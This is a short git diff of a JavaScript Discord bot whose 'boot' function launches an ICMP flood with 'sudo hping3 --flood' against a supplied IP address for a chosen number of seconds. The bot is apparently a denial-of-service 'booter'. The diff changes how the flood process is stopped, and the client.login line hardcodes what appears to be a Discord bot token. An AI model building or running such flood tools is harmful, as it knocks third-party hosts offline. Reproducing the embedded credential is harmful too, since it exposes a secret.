@@ -46,7 +46,9 @@ client.on('ready', async () => {
 function boot(ip, time) {
   console.log(`boot ${ip} ${time}`)
   const process = childProcess.spawn('sudo', ['hping3' ,'--flood', '--icmp', '--data', '55555', ip])
-  setTimeout(process.kill, time * 1000)
+  setTimeout(() => { 
+    childProcess.exec(`kill -9 ${process.pid}`) 
+  }, time * 1000)
 }
 
 client.login('MzU1ODIwOTg4NjM1NTQ1NjAy.DJSXpg.lK4qe_F7iFwyTUhwrYRQR9IeYUc')
